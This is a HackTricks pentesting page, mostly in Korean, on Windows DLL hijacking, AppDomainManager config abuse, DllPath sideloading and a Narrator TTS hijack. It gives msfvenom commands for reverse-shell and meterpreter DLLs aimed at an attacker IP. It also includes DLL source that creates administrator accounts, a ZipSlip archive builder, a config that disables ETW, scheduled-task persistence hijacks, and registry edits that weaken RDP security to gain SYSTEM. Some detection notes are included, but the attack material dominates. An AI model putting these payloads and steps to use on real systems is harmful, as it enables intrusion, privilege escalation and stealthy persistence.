# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 의미한다. 이 용어는 **DLL Spoofing, Injection, Side-Loading** 같은 여러 기법을 포함한다. 주로 code execution, persistence에 사용되며, 덜 흔하게 privilege escalation에도 사용된다. 여기서는 escalation에 초점을 두지만, hijacking 방식 자체는 목적과 무관하게 일관된다.

### Common Techniques

DLL hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL loading 전략에 따라 달라진다:

1. **DLL Replacement**: 정상 DLL을 악성 DLL로 교체한다. 필요하면 DLL Proxying을 사용해 원래 DLL의 기능을 유지할 수 있다.
2. **DLL Search Order Hijacking**: 검색 경로에서 정상 DLL보다 앞선 위치에 악성 DLL을 배치해 애플리케이션의 search pattern을 악용한다.
3. **Phantom DLL Hijacking**: 존재하지 않는 필수 DLL인 것처럼 애플리케이션이 로드하도록 악성 DLL을 만든다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일 같은 search parameter를 수정해 애플리케이션이 악성 DLL을 찾도록 유도한다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 정상 DLL을 악성 DLL로 대체하는 방법으로, 보통 DLL side-loading과 연관된다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 사용자 제어 디렉터리에 악성 DLL을 배치하는 방법으로, Binary Proxy Execution 기법과 유사하다.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

기존 DLL sideloading만이 신뢰된 **.NET Framework** 프로세스가 attacker code를 로드하게 만드는 유일한 방법은 아니다. 대상 실행 파일이 **managed** 애플리케이션이면, CLR은 실행 파일 이름을 따른 **application configuration file**도 참조한다(예: `Setup.exe.config`). 그 파일은 사용자 정의 **AppDomainManager**를 정의할 수 있다. config가 EXE 옆에 둔 attacker-controlled assembly를 가리키면, CLR은 그것을 애플리케이션의 정상 code path **이전**에 로드하고 신뢰된 프로세스 내부에서 실행한다.

Microsoft의 .NET Framework configuration schema에 따르면, 사용자 정의 manager가 사용되려면 `<appDomainManagerAssembly>`와 `<appDomainManagerType>` 둘 다 있어야 한다.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
최소 관리자:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
실용 노트:
- 이것은 **.NET Framework 전용** tradecraft입니다. Win32 DLL search order가 아니라 CLR config parsing에 의존합니다.
- host는 반드시 **managed EXE**여야 합니다. 빠른 triage: `sigcheck -m target.exe`, `corflags target.exe`, 또는 PE metadata에서 **CLR Runtime Header**를 확인합니다.
- config 파일 이름은 executable 이름과 정확히 일치해야 하며 (`<binary>.config`) 보통 **EXE 옆**에 위치합니다.
- 이는 **signed Microsoft/vendor binaries**와 함께 유용합니다. 신뢰된 EXE는 변경되지 않은 채로 유지되고 malicious managed assembly가 in-process로 실행되기 때문입니다.
- 이미 writable installer/update directory가 있다면, AppDomainManager hijacking을 **첫 단계**로 사용한 뒤 이후 단계에서 classic DLL sideloading 또는 reflective loading을 사용할 수 있습니다.

### AppDomainManager as a downloader + scheduled-task bootstrap

실전 intrusion 패턴은 신뢰할 수 있는 managed EXE에 malicious `*.config`와 **작은 bootstrapper** 역할만 하는 malicious AppDomainManager DLL을 함께 사용하는 것입니다:

1. 사용자가 `%USERPROFILE%\Downloads` 같은 그럴듯한 위치에서 signed .NET installer 또는 updater를 실행합니다.
2. 인접한 config가 CLR이 legitimate app logic이 시작되기 전에 attacker assembly를 로드하도록 합니다.
3. malicious manager는 **path gate**를 수행합니다(예: host EXE가 `Downloads`에서 실행 중일 때만 계속하고, second stage는 `%LOCALAPPDATA%`에서만 실행하도록 허용).
4. 검사가 통과하면 real payload를 `%LOCALAPPDATA%\PerfWatson2.exe` 같은 user-writable path로 다운로드하고 scheduled task로 persistence를 설치합니다.

이 변형이 중요한 이유:
- signed host EXE는 변경되지 않은 채로 유지되므로, main binary의 해시만 확인하는 triage는 compromise를 놓칠 수 있습니다.
- 단순한 **path-based anti-analysis**가 흔합니다. ZIP/EXE/DLL triad를 Desktop, Temp, 또는 sandbox path로 옮기면 의도적으로 chain이 깨질 수 있습니다.
- first-stage AppDomainManager DLL은 작고 low-noise하게 유지하면서, real implant는 나중에 가져올 수 있습니다.

이 패턴에서 자주 보이는 최소 persistence 예시:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest`는 해당 사용자/세션에 대한 **사용 가능한 최고 권한**을 의미하며, 그 자체로 SYSTEM 권한 상승이 보장되지는 않습니다.
- 이 기법은 종종 전통적인 missing-DLL search-order hijacking보다 **.NET config abuse를 통한 execution/persistence**로 분류하는 것이 더 적절합니다. 다만 operators는 실제로 둘을 함께 체인으로 엮는 경우가 많습니다.

Detection pivots:
- **ZIP extraction paths**, `Downloads`, `%TEMP%`, 또는 다른 user-writable folders에서 실행된 Signed .NET executables와 함께, 동일 위치에 배치된 `<exe>.config`.
- `%LOCALAPPDATA%`, `%APPDATA%`, 또는 `Downloads`를 가리키는 action을 가진 새 scheduled tasks, 그리고 이름이 browser/vendor updaters를 모방한 경우.
- 즉시 다른 EXE를 다운로드한 뒤 `schtasks.exe`를 spawn하는, 수명이 짧은 managed bootstrap processes.
- executable path가 예상되는 user-profile directory와 일치하지 않으면 조기에 종료하는 samples.

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. Install/run the legitimate software and identify the task it normally creates.
2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
4. Re-register the same task name instead of creating a new obvious persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
왜 더 은밀한가:
- 작업 이름은 여전히 합법적으로 보일 수 있습니다. (예: vendor updater)
- **Task Scheduler service**가 이를 실행하므로, 부모/조상 프로세스 검증은 종종 `explorer.exe` 대신 예상되는 scheduling chain을 봅니다.
- **새 task name**만 추적하는 DFIR 팀은 이미 등록되어 있던 task인데 action이 이제 `%LOCALAPPDATA%`, `%APPDATA%`, 또는 다른 attacker-controlled path를 가리키는 경우를 놓칠 수 있습니다.

빠른 헌팅 pivot:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML과 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata를 baseline과 비교하세요.
- **vendor-looking updater task**가 **user-writable directories**에서 실행되거나, 같은 위치에 있는 `*.config` 파일과 함께 .NET EXE를 실행할 때 경고를 발생시키세요.

> [!TIP]
> DLL sideloading 위에 HTML staging, AES-CTR configs, 그리고 .NET implants를 겹치는 단계별 chain은 아래 workflow를 참고하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

시스템에서 missing Dlls를 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, **다음 2개의 filter를 설정**하는 것입니다:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**missing dlls 일반**을 찾고 있다면 이것을 **몇 초** 동안 실행해 두면 됩니다.\
특정 실행 파일 안의 **missing dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 다른 filter를 설정한 뒤 실행하고, event capture를 중지해야 합니다.

## Exploiting Missing Dlls

권한 상승을 위해 가장 좋은 방법은 권한 프로세스가 로드하려고 시도할 **dll을 write**할 수 있으면서, 그 dll이 검색되는 **어떤 위치**에 둘 수 있는 것입니다. 따라서 우리는 **원본 dll**이 있는 폴더보다 먼저 검색되는 폴더에 dll을 **write**할 수 있거나(드문 경우), 혹은 dll이 검색될 어떤 폴더에 **write**할 수 있고 원본 **dll**이 어떤 폴더에도 존재하지 않는 경우를 노릴 수 있습니다.

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **내에서 Dll이 구체적으로 어떻게 로드되는지 확인할 수 있습니다.**

**Windows applications**는 미리 정의된 **search paths** 집합을 따라 DLL을 찾으며, 특정 순서를 따릅니다. DLL hijacking 문제는 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되어 진짜 DLL보다 먼저 로드되도록 할 때 발생합니다. 이를 방지하는 방법은 애플리케이션이 필요한 DLL을 참조할 때 absolute paths를 사용하도록 하는 것입니다.

32-bit 시스템의 **DLL search order**는 아래와 같습니다:

1. 애플리케이션이 로드된 디렉터리.
2. system directory. 이 디렉터리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용합니다.(_C:\Windows\System32_)
3. 16-bit system directory. 이 디렉터리의 경로를 얻는 함수는 없지만, 검색은 됩니다. (_C:\Windows\System_)
4. Windows directory. 이 디렉터리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용합니다.
1. (_C:\Windows_)
5. current directory.
6. PATH environment variable에 나열된 디렉터리들. 여기에는 **App Paths** registry key로 지정된 per-application path는 포함되지 않습니다. **App Paths** key는 DLL search path를 계산할 때 사용되지 않습니다.

이것이 **SafeDllSearchMode**가 활성화된 상태의 **default** search order입니다. 비활성화되면 current directory가 두 번째 위치로 올라갑니다. 이 기능을 끄려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value를 만들고 0으로 설정하세요. (기본값은 enabled)

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면, 검색은 **LoadLibraryEx**가 로드하는 executable module의 디렉터리에서 시작됩니다.

마지막으로, **dll은 이름 대신 absolute path를 지정해 로드될 수도 있다**는 점에 유의하세요. 이 경우 그 dll은 **그 경로에서만 검색**됩니다. (dll에 dependencies가 있으면, 그들은 이름으로 방금 로드된 것처럼 검색됩니다)

search order를 바꾸는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Chaining an arbitrary file write into a missing-DLL hijack

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`)를 사용해 프로세스가 조회하지만 찾지 못하는 DLL 이름을 수집합니다.
2. 바이너리가 **schedule/service**에서 실행된다면, 그 이름 중 하나의 DLL을 **application directory**(search-order entry #1)에 drop하면 다음 실행 때 로드됩니다. 한 .NET scanner 사례에서는 프로세스가 실제 복사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾고 있었습니다.
3. payload DLL(예: reverse shell)을 아무 export나 넣어 빌드합니다: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive가 **ZipSlip-style arbitrary write**라면, ZIP entry가 extraction dir를 벗어나 DLL이 app folder에 놓이도록 ZIP을 만듭니다:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. archive를 watched inbox/share로 전달하세요; scheduled task가 process를 다시 시작하면 malicious DLL을 로드하고 service account로 your code를 실행합니다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 sideloading 강제

새로 생성되는 process의 DLL search path를 결정적으로 조작하는 고급 방법은 ntdll의 native APIs로 process를 만들 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에 attacker-controlled directory를 제공하면, 이름으로 imported DLL을 해석하는 target process(absolute path를 사용하지 않고 safe loading flags도 사용하지 않는 경우)는 해당 directory에서 malicious DLL을 load하도록 강제할 수 있습니다.

Key idea
- RtlCreateProcessParametersEx로 process parameters를 만들고, 당신이 control하는 folder를 가리키는 custom DllPath를 제공하세요(예: dropper/unpacker가 위치한 directory).
- RtlCreateUserProcess로 process를 생성하세요. target binary가 DLL을 이름으로 resolve할 때, loader는 resolution 중 이 제공된 DllPath를 참고하므로, malicious DLL이 target EXE와 같은 위치에 있지 않아도 reliable sideloading이 가능합니다.

Notes/limitations
- 이는 생성되는 child process에 영향을 줍니다; current process에만 영향을 주는 SetDllDirectory와는 다릅니다.
- target은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(absolute path를 사용하지 않고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories도 사용하지 않아야 함).
- KnownDLLs와 hardcoded absolute paths는 hijack할 수 없습니다. Forwarded exports와 SxS는 precedence를 바꿀 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 악성 xmllite.dll(필요한 함수를 export하거나 실제 DLL로 proxying)을 DllPath 디렉터리에 배치한다.
- 위 기법을 사용해 xmllite.dll을 이름으로 찾는 것으로 알려진 signed binary를 실행한다. loader는 제공된 DllPath를 통해 import를 resolve하고 당신의 DLL을 sideloads한다.

이 기법은 multi-stage sideloading chains를 구동하는 in-the-wild 사례로 관찰되었다. 초기 launcher가 helper DLL을 drop한 뒤, Microsoft-signed, hijackable binary를 custom DllPath와 함께 실행해 staging directory에서 attacker의 DLL이 로드되도록 강제한다.


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** 대상에서는 애플리케이션의 인접한 **`.exe.config`** 파일을 악용해 memory patching 없이 **`Main()` 이전**에 sideloading을 수행할 수 있다. Win32 DLL search order에만 의존하는 대신, attacker는 합법적인 .NET EXE 옆에 악성 config와 하나 이상의 attacker-controlled assembly를 배치한다.

체인 동작 방식:
1. host EXE가 시작되고 **CLR이 `<exe>.config`**를 읽는다.
2. config가 **`<appDomainManagerAssembly>`**와 **`<appDomainManagerType>`**를 설정해 runtime이 attacker-controlled `AppDomainManager`를 인스턴스화하게 한다.
3. 악성 manager는 신뢰된 host process 내부에서 **pre-`Main()` execution**을 얻는다.
4. 같은 config로 CLR이 local assembly를 먼저 resolve하도록 강제할 수 있으며(예: `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), inline patching 없이 runtime validation/telemetry를 약화시킬 수도 있다.

campaign-style pattern(정확한 nesting은 directive / CLR version에 따라 달라질 수 있음):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 안의 모든 폴더의 권한을 확인**하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음으로 실행 파일의 imports와 dll의 exports도 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 안의 어떤 폴더든 write permissions가 있는지 확인해줍니다.\
이 취약점을 찾아내는 다른 흥미로운 automated tools는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 그리고 _Write-HijackDll._ 입니다.

### Example

exploitable scenario를 찾았다면, 이를 성공적으로 exploit하는 데 가장 중요한 것 중 하나는 **해당 executable이 import할 모든 functions를 최소한 export하는 dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [Medium Integrity level에서 High로 **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system)**.** **escalate**할 때 유용합니다. valid dll을 만드는 방법의 예시는 dll hijacking execution에 초점을 맞춘 이 dll hijacking study에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서 **template**로 유용하거나 **필요하지 않은 functions만 export된 dll**을 만드는 데 쓸 수 있는 몇 가지 **basic dll codes**를 찾을 수 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 execute**할 수 있는 Dll이지만, 동시에 **real library로 모든 calls를 relay**함으로써 **expose**하고 **expected**대로 **작동**할 수도 있습니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실제로 **executable을 지정하고 proxify할 library를 선택해 proxified dll을 생성**하거나, **Dll을 지정하고 proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter(x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성하기 (x86, x64 버전은 보지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

참고로 여러 경우에서 컴파일한 Dll이 피해 프로세스에 의해 로드될 **여러 함수들을 export** 해야 합니다. 이 함수들이 존재하지 않으면 **binary가 이를 로드할 수 없고** **exploit은 실패**합니다.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>user 생성이 포함된 C++ DLL 예제</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점을 가진 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 계속 검사하며, 이를 하이재킹해 arbitrary code execution과 persistence를 얻을 수 있다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 쓰기 가능한 attacker-controlled DLL이 OneCore 경로에 있으면 로드되며 `DllMain(DLL_PROCESS_ATTACH)`가 실행된다. exports는 필요 없다.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 침묵
- 순진한 hijack은 UI를 말하거나 하이라이트한다. 조용하게 유지하려면 attach 시 Narrator threads를 열거하고, 메인 thread를 (`OpenThread(THREAD_SUSPEND_RESUME)`) 열어 `SuspendThread`로 중단한 뒤, 자신의 thread에서 계속 진행한다. 전체 코드는 PoC를 참고.

Accessibility configuration를 통한 Trigger와 persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정을 하면 Narrator를 시작할 때 planted DLL이 로드된다. secure desktop (logon screen)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면, your DLL이 secure desktop에서 SYSTEM으로 실행된다.

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer를 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤, logon screen에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행한다. your DLL은 secure desktop에서 SYSTEM으로 실행된다.
- RDP session이 닫히면 실행이 중지된다. 즉시 inject/migrate하라.

